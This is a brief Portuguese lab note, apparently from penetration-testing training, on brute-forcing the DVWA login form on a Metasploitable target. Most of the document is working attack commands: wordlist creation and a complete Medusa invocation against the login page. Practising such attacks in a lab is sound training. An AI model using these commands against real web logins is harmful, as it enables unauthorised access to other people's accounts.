# BRUTEFORCE aplicados em Sistemas Web (formulários) no `DVWA Metasploitable`

Criação das listas de usuários possíveis para acesso e automatização com `MEDUSA`

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

Criação da lista de senhas para acesso e automatização com `MEDUSA`

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin\nWelcome123\npass" > pass.txt
```

Bruteforce `Medusa`

```bash
medusa -h (IP ALVO) -U users.txt -p pass.txt -M http \
-m PAGE:"/dvwa/login.php" \
-m FORM: "username=^USER^&password=^PASS^&Login=Login" \
-m "FAIL=Login failed" -t 6
```
